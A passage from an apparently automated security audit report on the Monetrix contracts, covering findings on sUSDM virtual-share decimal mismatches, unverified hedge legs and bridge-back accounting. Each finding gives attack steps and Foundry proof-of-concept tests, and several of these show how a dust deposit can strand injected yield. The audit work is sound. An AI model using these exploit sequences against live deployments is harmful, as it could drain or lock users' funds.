sUSDM reports 6 share decimals but also sets `_decimalsOffset()` to 6. OpenZeppelin ERC4626 therefore adds 1e6 virtual shares to every conversion even though raw shares are already 6-decimal units. A permissionless user can call `mint(1, attacker)` on an empty vault, paying only 1 smallest USDM unit for 1 raw share. Later, the normal vault `injectYield()` path only checks `totalSupply() > 0`, so it can inject large yield into a vault whose real supply is 1 share while the conversion denominator includes 1,000,000 virtual shares. The vulnerable logic is: `function _decimalsOffset() internal pure override returns (uint8) { return 6; }`, `function decimals() public pure override returns (uint8) { return 6; }`, and `require(totalSupply() > 0, "sUSDM: no stakers"); IERC20(asset()).safeTransferFrom(msg.sender, address(this), usdmAmount);`. When the attacker burns the only real share through `cooldownShares`, only about 1/1,000,001 of the injected assets is moved to escrow and the rest remains in sUSDM with `totalSupply() == 0`. Because synchronous `withdraw`/`redeem` are disabled and no sweep exists, the remaining USDM is effectively stranded.

## Impact
A permissionless dust position can cause a subsequent legitimate yield injection to strand almost the entire injected yield in the sUSDM contract. This is a real loss of yield/protocol assets under normal launch or low-supply conditions, though it requires the vault to inject yield while real sUSDM supply is tiny.

## Command to Run Test


## Proof of Concept
1. Deploy and initialize sUSDM with USDM, config, escrow, and vault wiring.
2. Attacker mints exactly 1 raw sUSDM share into an empty vault, costing 1 smallest USDM unit because ERC4626 `previewMint(1)` rounds up.
3. The legitimate vault injects 1,000,000 USDM of yield; `injectYield` accepts this because `totalSupply() == 1`.
4. `convertToAssets(1)` returns only about 1 USDM because conversion uses `totalSupply + 1e6` virtual shares.
5. Attacker calls `cooldownShares(1)`, burning the entire real supply.
6. `totalSupply()` becomes zero while more than 999,000 USDM remains in sUSDM and is not claimable by any real share holder.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "src/tokens/sUSDM.sol";
import "src/tokens/sUSDMEscrow.sol";
import "src/core/MonetrixConfig.sol";
import "src/governance/MonetrixAccessController.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract sUSDMDustVirtualSharesPoC is Test {
    MockUSDM usdm;
    sUSDM susdm;
    sUSDMEscrow escrow;
    MonetrixAccessController acl;
    MonetrixConfig config;
    address attacker = address(0xA11CE);

    function setUp() public {
        usdm = new MockUSDM();

        MonetrixAccessController aclImpl = new MonetrixAccessController();
        ERC1967Proxy aclProxy = new ERC1967Proxy(
            address(aclImpl),
            abi.encodeCall(MonetrixAccessController.initialize, (address(this)))
        );
        acl = MonetrixAccessController(address(aclProxy));
        acl.grantRole(acl.GOVERNOR(), address(this));

        MonetrixConfig cfgImpl = new MonetrixConfig();
        ERC1967Proxy cfgProxy = new ERC1967Proxy(
            address(cfgImpl),
            abi.encodeCall(MonetrixConfig.initialize, (address(0xBEEF), address(0xCAFE), address(acl)))
        );
        config = MonetrixConfig(address(cfgProxy));

        sUSDM sImpl = new sUSDM();
        ERC1967Proxy sProxy = new ERC1967Proxy(
            address(sImpl),
            abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
        );
        susdm = sUSDM(address(sProxy));

        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(address(this));

        usdm.mint(attacker, 1);
        usdm.mint(address(this), 1_000_000e6);
    }

    function testDustMintLocksInjectedYieldInVirtualShares() public {
        vm.startPrank(attacker);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.mint(1, attacker);
        vm.stopPrank();

        assertEq(susdm.totalSupply(), 1);

        uint256 yieldAmount = 1_000_000e6;
        usdm.approve(address(susdm), yieldAmount);
        susdm.injectYield(yieldAmount);

        uint256 claimable = susdm.convertToAssets(susdm.balanceOf(attacker));
        assertLt(claimable, 2e6); // less than 2 USDM claimable from 1,000,000 USDM injected

        vm.prank(attacker);
        susdm.cooldownShares(1);

        assertEq(susdm.totalSupply(), 0);
        uint256 stranded = usdm.balanceOf(address(susdm));
        assertGt(stranded, 999_000e6);
        assertGt(stranded, usdm.balanceOf(address(escrow)) * 999);
    }
}


## Suggested Mitigation
Do not combine 6 reported share decimals with a 6-decimal ERC4626 virtual-share offset. Set `_decimalsOffset()` to 0 for a 6-decimal asset/share vault, or enforce a meaningful minimum real supply before `injectYield`. Also add a governed recovery path for residual assets when `totalSupply() == 0`, and block dust `mint`/`deposit` amounts that can create tiny real supply relative to virtual shares.
```

### M-21 / `9BEHf5Q0oJXlBT_zGCxNt`
- Finding title: Hedge execution emits success without proving both spot and perp legs filled
- Report lines: 2111-2191
```md
## [M-21]. Hedge execution emits success without proving both spot and perp legs filled

## id: 9BEHf5Q0oJXlBT_zGCxNt

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.executeHedge

## Finding Status: Valid
### Finding Status Justification: executeHedge sends buy-spot and short-perp actions independently and immediately emits HedgeExecuted. closeHedge has the same pattern for closing legs. There is no readback of HyperCore balances or positions to verify matched deltas. If one action fills or is accepted and the other drops or rests, the vault can hold naked exposure. Whitelist checks and repair functions do not prove atomic execution, so the reported issue exists.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`executeHedge()` and `closeHedge()` dispatch two independent HyperCore actions and never verify post-trade L1 state. A syntactically valid spot order can be accepted while the paired perp order is dropped, rejected, or left unfilled, yet the vault still emits `HedgeExecuted` and records no failed batch state. Vulnerable snippet: `ActionEncoder.sendBuySpot(params); ActionEncoder.sendShortPerp(params); emit HedgeExecuted(...)`. There is no post-state check that spot notional and signed perp exposure changed by the matched size within tolerance.

## Impact
The strategy can be left with a naked spot or naked short leg while off-chain systems observe a successful hedge event. Market movement against the unmatched exposure can cause real protocol losses and undercollateralize USDM backing.

## Command to Run Test


## Proof of Concept
1. Operator submits valid whitelisted hedge params for a spot/perp pair.
2. HyperCore accepts/fills the spot buy action.
3. The paired perp short action is silently dropped, rejected, or not filled due to venue state or price movement.
4. The vault emits `HedgeExecuted` and stores no repair-required state.
5. The protocol now holds directional spot exposure; adverse price movement reduces backing.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

contract MockHyperCore {
    uint256 public spot;
    int256 public perp;
    bool public dropNextPerp;
    function setDropNextPerp(bool v) external { dropNextPerp = v; }
    function buySpot(uint256 size) external { spot += size; }
    function shortPerp(uint256 size) external { if (!dropNextPerp) perp -= int256(size); }
}

contract HedgeHarness {
    MockHyperCore public core;
    event HedgeExecuted(uint256 indexed batchId, uint32 spotAsset, uint32 perpAsset, uint64 size);
    constructor(MockHyperCore _core) { core = _core; }
    function executeHedge(uint256 batchId, uint64 size) external {
        require(size > 0, "zero size");
        core.buySpot(size);
        core.shortPerp(size);
        emit HedgeExecuted(batchId, 10001, 1, size);
    }
}

contract HedgeAtomicityPoC is Test {
    function testHedgeCanSucceedWithOnlyOneLegChanged() external {
        MockHyperCore core = new MockHyperCore();
        HedgeHarness vault = new HedgeHarness(core);
        core.setDropNextPerp(true);

        vault.executeHedge(1, 100e8);

        assertEq(core.spot(), 100e8);
        assertEq(core.perp(), 0);
        assertGt(core.spot(), uint256(core.perp() < 0 ? -core.perp() : core.perp()));
    }
}

## Suggested Mitigation
After dispatching hedge or close actions, read HyperCore post-state and require the net spot/perp delta to be within configured residual tolerance before emitting success. If synchronous fill guarantees are unavailable, record a pending batch and require an explicit repair/settlement path before treating the hedge as active.
```

### M-22 / `n-cuygU2v7GVv19-anjrm`
- Finding title: Independent hedge legs can leave MonetrixVault unhedged when one HyperCore order is dropped or partially filled
- Report lines: 2192-2239
```md
## [M-22]. Independent hedge legs can leave MonetrixVault unhedged when one HyperCore order is dropped or partially filled

## id: n-cuygU2v7GVv19-anjrm

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
MonetrixVault.executeHedge

## Finding Status: Valid
### Finding Status Justification: The hedge and close flows submit separate HyperCore limit orders and do not verify that both legs were filled in matching size. The contract stores no pending or failed-batch state and emits success regardless of L1 post-state. This can create unpaired spot or perp exposure and real backing loss if prices move before manual repair. The issue follows directly from the shown code and current HyperCore action semantics.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`executeHedge` and `closeHedge` dispatch two separate HyperCore actions and immediately emit success without checking that both legs were accepted and filled in the intended matched size. Vulnerable snippet: `ActionEncoder.sendBuySpot(params); ActionEncoder.sendShortPerp(params); ... emit HedgeExecuted(...)`. A valid operator transaction can therefore leave only the spot leg or only the perp leg changed if HyperCore accepts one action but drops, rejects, or partially fills the other. The contract stores no failed-batch state and does not read post-trade L1 balances to enforce the invariant that spot and perp exposure remain matched.

## Impact
Protocol backing can become directionally exposed. A one-leg hedge can create real market-loss risk for USDM backing until an operator detects and repairs the residual position; users bear the downside through reduced solvency or delayed redemptions.

## Command to Run Test


## Proof of Concept
1. Operator submits a syntactically valid hedge for a whitelisted pair. 2. The first CoreWriter action is accepted/fills, but the second action is silently dropped, rejected, or only partially filled by HyperCore. 3. `MonetrixVault.executeHedge` does not verify post-state and emits `HedgeExecuted`. 4. The vault holds unmatched spot/perp exposure. 5. If price moves before manual repair, protocol backing takes directional loss.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "src/core/MonetrixVault.sol";
import "src/core/ActionEncoder.sol";
contract ACL { bytes32 constant OPERATOR = keccak256("MONETRIX_OPERATOR"); bytes32 constant GOVERNOR = keccak256("MONETRIX_GOVERNOR"); bytes32 constant GUARDIAN = keccak256("MONETRIX_GUARDIAN"); bytes32 constant UPGRADER = keccak256("MONETRIX_UPGRADER"); function hasRole(bytes32,address) external pure returns (bool) { return true; } }
contract Cfg { function isPerpWhitelisted(uint32) external pure returns (bool) { return true; } function perpToSpotPairAssetId(uint32) external pure returns (uint32) { return 10001; } function perpToSpot(uint32) external pure returns (uint32) { return 1; } }
contract MockCoreWriter { uint256 public accepted; uint256 public dropped; function sendRawAction(bytes calldata) external { if (accepted == 0) accepted++; else dropped++; } }
contract HedgeAtomicityPoC is Test { address constant CORE = 0x3333333333333333333333333333333333333333; function test_executeHedge_emitsSuccessWhenSecondLegDropped() external { MockCoreWriter writer = new MockCoreWriter(); vm.etch(CORE, address(writer).code); ACL acl = new ACL(); Cfg cfg = new Cfg(); MonetrixVault impl = new MonetrixVault(); bytes memory init = abi.encodeCall(MonetrixVault.initialize, (address(0x10), address(0x11), address(0x12), address(cfg), address(0x13), address(acl))); MonetrixVault vault = MonetrixVault(address(new ERC1967Proxy(address(impl), init))); ActionEncoder.HedgeParams memory p = ActionEncoder.HedgeParams({spotAsset:10001, perpAsset:1, size:1e8, spotPrice:50_000e8, perpPrice:50_000e8, cloid:0, tif:2, spotReduceOnly:false, perpReduceOnly:false}); vault.executeHedge(1, p); assertEq(MockCoreWriter(CORE).accepted(), 1); assertEq(MockCoreWriter(CORE).dropped(), 1); } }

## Suggested Mitigation
Make hedge batches verifiable and repairable: record a pending batch, read post-trade L1 spot/perp state after execution, enforce residual exposure within configured tolerance, and avoid emitting success until both legs are confirmed. If HyperCore cannot provide atomic execution, add explicit batch failure state and require repair before more strategy actions.
```

### M-23 / `ixjYBbG7rWa4eVh74Lapg`
- Finding title: PM supplied USDC is treated as bridgeable spot balance, allowing bridge-back accounting to decrease without funds arriving
- Report lines: 2240-2328
```md
## [M-23]. PM supplied USDC is treated as bridgeable spot balance, allowing bridge-back accounting to decrease without funds arriving

## id: ixjYBbG7rWa4eVh74Lapg

## Derived From Pattern/Invariant
UncheckedLowLevelCallResults / AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.bridgePrincipalFromL1

## Finding Status: Valid
### Finding Status Justification: When pmEnabled is true, _sendL1Bridge adds PrecompileReader.suppliedBalance to spotBalance.total before sending ACTION_SEND_ASSET. Supplied USDC is a 0x811 position, not free spot USDC, and the code does not withdraw it before bridging. Because bridgePrincipalFromL1 reduces outstandingL1Principal before action finality is verifiable, a silently dropped SEND_ASSET can leave redemptions unfunded and principal accounting understated. The issue is present in today's code and does not depend on non-standard token behavior.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
`bridgePrincipalFromL1()` decreases `outstandingL1Principal` before sending the HyperCore bridge action, and `_sendL1Bridge()` treats 0x811 supplied USDC as available for the SEND_ASSET bridge action. Supplied balances are not spot balances and must be withdrawn from BLP/PM before they can be sent. If the vault has insufficient L1 spot USDC but enough supplied USDC, the local precheck passes, the CoreWriter call can accept/drop the action according to HyperCore semantics, and vault accounting records principal as bridged even though no EVM USDC arrives.

Vulnerable snippet:
`outstandingL1Principal -= amount; _sendL1Bridge(amount);`

`uint256 l1Available = uint256(PrecompileReader.spotBalance(address(this), usdcToken).total); if (pmEnabled) { l1Available += uint256(PrecompileReader.suppliedBalance(address(this), usdcToken)); } require(l1Available >= TokenMath.usdcEvmToL1Wei(amount), ...); ActionEncoder.sendBridgeToL1(amount);`

## Impact
Pending redemptions can remain unfunded while `outstandingL1Principal` is permanently reduced. Repeated bridge-back attempts can consume the principal accounting limit without actually delivering USDC, causing redemption liquidity DoS and breaking the binding between tracked L1 principal and recoverable funds.

## Command to Run Test


## Proof of Concept
1. Vault has `pmEnabled = true`, `outstandingL1Principal = 1,000 USDC`, redemption shortfall of 1,000 USDC, zero L1 spot USDC, and 1,000 USDC supplied in 0x811.
2. Operator calls `bridgePrincipalFromL1(1,000e6)` to fund redemptions.
3. `_sendL1Bridge()` adds supplied balance to spot balance, so the require passes even though spot balance is zero.
4. `outstandingL1Principal` is decremented before the CoreWriter action outcome is verifiable.
5. The SEND_ASSET action cannot spend supplied balance as spot; if HyperCore drops/does not credit the bridge, no EVM USDC arrives but the vault now believes principal was recovered.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "src/core/MonetrixVault.sol";
import "src/interfaces/HyperCoreConstants.sol";
import "src/interfaces/IHyperCore.sol";
import "src/governance/IMonetrixAccessController.sol";

interface IShortfall { function shortfall() external view returns (uint256); }

contract VaultHarness is MonetrixVault {
    function initHarness(address _acl, address _redeem, address _yield, address _accountant) external {
        acl = IMonetrixAccessController(_acl);
        redeemEscrow = _redeem;
        yieldEscrow = _yield;
        accountant = _accountant;
        pmEnabled = true;
        outstandingL1Principal = 1_000e6;
    }
}

contract PmSuppliedBridgeDropTest is Test {
    function testSuppliedBalanceConsumesOutstandingPrincipalWithoutSpotBridge() external {
        VaultHarness vault = new VaultHarness();
        address acl = address(0xA11CE);
        address redeem = address(0xBEEF);
        vault.initHarness(acl, redeem, address(0xCAFE), address(0xD00D));

        bytes32 op = keccak256("MONETRIX_OPERATOR");
        vm.mockCall(acl, abi.encodeWithSignature("OPERATOR()"), abi.encode(op));
        vm.mockCall(acl, abi.encodeWithSignature("hasRole(bytes32,address)", op, address(this)), abi.encode(true));
        vm.mockCall(redeem, abi.encodeWithSelector(IShortfall.shortfall.selector), abi.encode(1_000e6));

        vm.mockCall(HyperCoreConstants.PRECOMPILE_SPOT_BALANCE, abi.encode(address(vault), uint64(0)), abi.encode(uint64(0), uint64(0), uint64(0)));
        vm.mockCall(HyperCoreConstants.PRECOMPILE_SUPPLIED_BALANCE, abi.encode(address(vault), uint64(0)), abi.encode(uint64(0), uint64(0), uint64(0), uint64(100_000_000_000)));
        vm.mockCall(HyperCoreConstants.CORE_WRITER, abi.encodeWithSelector(ICoreWriter.sendRawAction.selector), abi.encode());

        vault.bridgePrincipalFromL1(1_000e6);
        assertEq(vault.outstandingL1Principal(), 0, "principal accounting was consumed");
    }
}

## Suggested Mitigation
Do not include 0x811 supplied balances in `_sendL1Bridge()` availability for SEND_ASSET. Require sufficient spot USDC only, or atomically withdraw supplied USDC to spot first and verify the post-action spot balance/bridge credit before decrementing `outstandingL1Principal`. Move the principal decrement after a verifiable state transition where possible.
```

### M-24 / `4YjJddXWcRv9EM5yYCoju`
- Finding title: Held HyperCore USDC can falsely reduce outstanding principal in MonetrixVault.bridgePrincipalFromL1
- Report lines: 2329-2444
```md
## [M-24]. Held HyperCore USDC can falsely reduce outstanding principal in MonetrixVault.bridgePrincipalFromL1

## id: 4YjJddXWcRv9EM5yYCoju

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
MonetrixVault.bridgePrincipalFromL1

## Finding Status: Valid
### Finding Status Justification: PrecompileReader.SpotBalance exposes both total and hold, but _sendL1Bridge uses only total when deciding whether L1 USDC is bridgeable. Funds in hold can be locked by open orders and not spendable for SEND_ASSET. Because outstandingL1Principal is decremented before the CoreWriter action has a confirmed L1 effect, a silent L1 drop can consume bridge-back accounting without delivering EVM USDC. The normal require checks the wrong balance field and does not eliminate the issue.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
MonetrixVault treats the HyperCore spot balance `total` field as spendable when sending principal back from L1, but HyperCore spot balances also expose a `hold` amount that can be locked in open orders or other venue holds. The state is decremented before the CoreWriter action, and the CoreWriter path provides no synchronous proof that the SEND_ASSET action actually moved funds. Vulnerable snippets: `outstandingL1Principal -= amount; _sendL1Bridge(amount);` and `_sendL1Bridge` uses `uint256 l1Available = uint256(PrecompileReader.spotBalance(address(this), usdcToken).total); ... require(l1Available >= TokenMath.usdcEvmToL1Wei(amount)); ActionEncoder.sendBridgeToL1(amount);`. If `total >= amount` but `total - hold < amount`, the local require passes while the L1 bridge action can be dropped or fail venue-side. The EVM transaction still reduces `outstandingL1Principal` and emits `PrincipalBridgedFromL1`, leaving redemption liquidity unfunded and reducing the cap available for future legitimate bridge-back attempts.

## Impact
Principal accounting can drift below actual L1 principal after a failed or silently dropped bridge-back action. During redemption stress this can delay or strand funds because both `bridgePrincipalFromL1` and `emergencyBridgePrincipalFromL1` are capped by the already-decremented `outstandingL1Principal`. Users with matured redemption claims remain unable to receive USDC until governance uses a raw emergency path or upgrades/reconciles accounting.

## Command to Run Test


## Proof of Concept
1. The vault has 1 USDC of `outstandingL1Principal` and 1 USDC redemption shortfall.
2. HyperCore reports the vault has 1 USDC spot `total`, but the entire amount is in `hold`, so free spendable USDC is 0.
3. An operator calls `bridgePrincipalFromL1(1e6)` during normal redemption funding.
4. `_sendL1Bridge` checks `total` only, so the local require passes.
5. The CoreWriter action is accepted by the EVM call but cannot actually send the held funds on L1.
6. The vault has already reduced `outstandingL1Principal` to 0, so the same principal cannot be retried through the normal bridge-back function even though no redemption liquidity arrived.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MonetrixVault} from "../src/core/MonetrixVault.sol";

contract ACLMock {
    function GUARDIAN() external pure returns (bytes32) { return bytes32(uint256(1)); }
    function GOVERNOR() external pure returns (bytes32) { return bytes32(uint256(2)); }
    function UPGRADER() external pure returns (bytes32) { return bytes32(uint256(3)); }
    function OPERATOR() external pure returns (bytes32) { return bytes32(uint256(4)); }
    function hasRole(bytes32, address) external pure returns (bool) { return true; }
    function checkRole(bytes32, address) external pure {}
}

contract RedeemEscrowMock {
    uint256 private immutable sf;
    constructor(uint256 _sf) { sf = _sf; }
    function shortfall() external view returns (uint256) { return sf; }
}

contract VaultHarness is MonetrixVault {
    function exposedSetOutstanding(uint256 amount) external { outstandingL1Principal = amount; }
}

contract SpotBalanceAllHeld {
    fallback(bytes calldata) external returns (bytes memory) {
        uint64 total = 100_000_000; // 1 USDC in HyperCore 8-decimal wei
        uint64 hold = 100_000_000;  // all of it is held, so free balance is zero
        return abi.encode(total, hold, uint64(0));
    }
}

contract CoreWriterSilentDrop {
    function sendRawAction(bytes calldata) external {}
}

contract BridgePrincipalHeldBalanceTest is Test {
    address constant SPOT_BALANCE_PRECOMPILE = 0x0000000000000000000000000000000000000801;
    address constant CORE_WRITER = 0x3333333333333333333333333333333333333333;

    function testHeldL1UsdcStillDecrementsOutstandingPrincipal() external {
        uint256 amount = 1e6;
        ACLMock acl = new ACLMock();
        VaultHarness impl = new VaultHarness();
        bytes memory init = abi.encodeCall(
            MonetrixVault.initialize,
            (
                address(uint160(0xA11CE)),
                address(uint160(0xB0B)),
                address(uint160(0xCAFE)),
                address(uint160(0xC0FFEE)),
                address(uint160(0xD0D0)),
                address(acl)
            )
        );
        VaultHarness vault = VaultHarness(address(new ERC1967Proxy(address(impl), init)));
        RedeemEscrowMock redeemEscrow = new RedeemEscrowMock(amount);
        vault.setAccountant(address(uint160(0x1234)));
        vault.setRedeemEscrow(address(redeemEscrow));
        vault.setYieldEscrow(address(uint160(0x5678)));
        vault.exposedSetOutstanding(amount);

        vm.etch(SPOT_BALANCE_PRECOMPILE, address(new SpotBalanceAllHeld()).code);
        vm.etch(CORE_WRITER, address(new CoreWriterSilentDrop()).code);

        vault.bridgePrincipalFromL1(amount);

        assertEq(vault.outstandingL1Principal(), 0);
        assertEq(redeemEscrow.shortfall(), amount);
    }
}

## Suggested Mitigation
Use spendable L1 balance, not raw `total`, when checking bridge-back capacity. For spot USDC, require `total > hold` and compare `total - hold` against `TokenMath.usdcEvmToL1Wei(amount)`. Because CoreWriter does not provide a synchronous delivery receipt, consider tracking bridge-back requests as pending and decrementing `outstandingL1Principal` only after a later precompile/accounting reconciliation confirms the L1 balance decreased or EVM-side funds arrived.
```

### M-25 / `1V-Z9xUIIGsxmEi58p3vR`
- Finding title: Dust first stake strands injected yield in sUSDM virtual shares during cooldown
- Report lines: 2445-2561
```md
## [M-25]. Dust first stake strands injected yield in sUSDM virtual shares during cooldown

## id: 1V-Z9xUIIGsxmEi58p3vR

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
sUSDM.cooldownShares

## Finding Status: Valid
### Finding Status Justification: The cooldown path uses convertToAssets before burning and then pulls that amount into escrow. With decimals() and _decimalsOffset() both set to 6, a dust first deposit creates real shares matching the virtual-share denominator. After yield injection, convertToAssets for all real shares returns about half of totalAssets, not all assets. Burning all real shares therefore leaves the virtual-share portion behind in sUSDM with no claimant and no enabled redeem/withdraw path. Existing guards only pause/reentrancy-protect execution and do not address the accounting issue. The issue is concrete today and permissionless, though mainly under low-supply conditions.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 decimals but also returns a 6-decimal ERC4626 virtual share offset. OpenZeppelin ERC4626 conversion math therefore includes `10 ** _decimalsOffset()` virtual shares while the token itself still displays only 6 decimals. A 1-base-unit first stake mints 1e6 real share units, exactly matching the 1e6 virtual shares. After a large `injectYield`, `convertToAssets(totalSupply())` only returns about half of `totalAssets()`. When the dust staker cools down all real shares, `totalSupply()` becomes zero while the virtual-share portion remains as unclaimable USDM in sUSDM. Vulnerable snippets: `function _decimalsOffset() internal pure override returns (uint8) { return 6; }`, `function decimals() public pure override returns (uint8) { return 6; }`, and `uint256 assets = convertToAssets(shares); _burn(msg.sender, shares); escrow.deposit(assets);`.

## Impact
A permissionless dust first depositor can cause a normal vault yield injection to strand a material portion of real USDM in sUSDM with no real share holder able to claim it, breaking the stated exchange-rate and full-exit accounting invariants.

## Command to Run Test


## Proof of Concept
1. Deploy and initialize sUSDM with a 6-decimal USDM asset and escrow. 2. Attacker deposits 1 smallest USDM unit, receiving 1e6 raw sUSDM shares. 3. The legitimate vault injects a large yield amount while totalSupply is nonzero. 4. Attacker calls cooldownShares for all real shares. 5. Because real shares equal the virtual share constant, only about half of totalAssets is moved to escrow; the rest remains in sUSDM after totalSupply becomes zero.

## Proof of Code
pragma solidity ^0.8.28;

import 'forge-std/Test.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol';
import '../src/tokens/sUSDM.sol';
import '../src/tokens/sUSDMEscrow.sol';
import '../src/governance/IMonetrixAccessController.sol';

contract MockUSDM is ERC20 {
    constructor() ERC20('USDM', 'USDM') {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockConfig {
    uint256 public unstakeCooldown = 3 days;
    uint256 public maxYieldPerInjection = type(uint256).max;
}

contract MockACL is IMonetrixAccessController {
    mapping(bytes32 => mapping(address => bool)) internal roles;
    function GUARDIAN() external pure returns (bytes32) { return keccak256('MONETRIX_GUARDIAN'); }
    function GOVERNOR() external pure returns (bytes32) { return keccak256('MONETRIX_GOVERNOR'); }
    function UPGRADER() external pure returns (bytes32) { return keccak256('MONETRIX_UPGRADER'); }
    function OPERATOR() external pure returns (bytes32) { return keccak256('MONETRIX_OPERATOR'); }
    function grant(bytes32 role, address account) external { roles[role][account] = true; }
    function hasRole(bytes32 role, address account) public view returns (bool) { return roles[role][account]; }
    function checkRole(bytes32 role, address account) external view { require(roles[role][account], 'NO_ROLE'); }
}

contract SUSDMSharePricePoC is Test {
    MockUSDM usdm;
    MockConfig config;
    MockACL acl;
    sUSDM susdm;
    sUSDMEscrow escrow;
    address vault = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        usdm = new MockUSDM();
        config = new MockConfig();
        acl = new MockACL();
        acl.grant(acl.GOVERNOR(), address(this));
        sUSDM impl = new sUSDM();
        bytes memory initData = abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)));
        susdm = sUSDM(address(new ERC1967Proxy(address(impl), initData)));
        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(vault);
    }

    function testDustFirstStakeStrandsYieldInVirtualShares() public {
        usdm.mint(attacker, 1);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.deposit(1, attacker);
        vm.stopPrank();
        assertEq(susdm.balanceOf(attacker), 1e6);

        uint256 yieldAmount = 100e6;
        usdm.mint(vault, yieldAmount);
        vm.startPrank(vault);
        usdm.approve(address(susdm), yieldAmount);
        susdm.injectYield(yieldAmount);
        vm.stopPrank();

        uint256 assetsBeforeCooldown = susdm.totalAssets();
        vm.prank(attacker);
        susdm.cooldownShares(susdm.balanceOf(attacker));

        uint256 stranded = usdm.balanceOf(address(susdm));
        assertEq(susdm.totalSupply(), 0);
        assertGt(stranded, assetsBeforeCooldown / 3);
        assertGt(stranded, 1e6);
    }
}


## Suggested Mitigation
Make the ERC4626 share precision internally and externally consistent. For a 6-decimal sUSDM token with an intended 1:1 initial displayed exchange rate, return `_decimalsOffset() = 0`; alternatively return 12 share decimals and update all integrations/docs. Also consider requiring a meaningful minimum real share supply before `injectYield` can distribute yield.
```

### M-26 / `UVYDK0igzip7Vve9a3yJa`
- Finding title: Low-supply sUSDM deposits let virtual shares capture and strand injected yield
- Report lines: 2562-2672
```md
## [M-26]. Low-supply sUSDM deposits let virtual shares capture and strand injected yield

## id: UVYDK0igzip7Vve9a3yJa

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
sUSDM.injectYield

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 share decimals but also sets `_decimalsOffset()` to 6, so OpenZeppelin ERC4626 conversion math adds 1e6 virtual shares while the real initial supply can also be only 1e6 raw shares from a 1-unit USDM deposit. When yield is injected while real supply is small, a material fraction of `totalAssets()` is priced against virtual shares instead of real holders. Vulnerable snippets: `function _decimalsOffset() internal pure override returns (uint8) { return 6; }`, `function decimals() public pure override returns (uint8) { return 6; }`, and `injectYield()` only checks `require(totalSupply() > 0, "sUSDM: no stakers")` before accepting yield. With `totalSupply() == 1e6`, virtual shares equal real shares, so `convertToAssets(totalSupply())` returns only about half of the injected USDM; the remainder stays in sUSDM after all real shares are burned and is not represented by any pending claim.

## Impact
A permissionless dust staker can be the only real holder before a normal vault yield injection, then claim roughly half of the injected yield after cooldown while the other half is stranded in the vault with `totalSupply() == 0`. This misallocates protocol yield and can permanently lock large USDM amounts inside sUSDM.

## Command to Run Test
forge test --match-contract SUSDMVirtualShareLeakTest

## Proof of Concept
1. Start with an empty initialized sUSDM vault and configured escrow/vault. 2. Attacker deposits 1 smallest USDM unit, minting 1e6 raw sUSDM shares. 3. The trusted vault calls `injectYield(1_000_000e6)` during normal yield distribution because `totalSupply() > 0`. 4. Attacker calls `cooldownShares(totalSupply())`. 5. `convertToAssets(1e6)` returns about `500_000e6`, so the attacker escrows about half the yield. 6. `totalSupply()` becomes zero while the remaining about `500_000e6` USDM stays in sUSDM and is not claimable by any real share holder.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "src/tokens/sUSDM.sol";
import "src/tokens/sUSDMEscrow.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockConfig {
    uint256 public unstakeCooldown = 0;
    uint256 public maxYieldPerInjection = type(uint256).max;
}

contract MockACL {
    bytes32 public constant GOVERNOR = keccak256("MONETRIX_GOVERNOR");
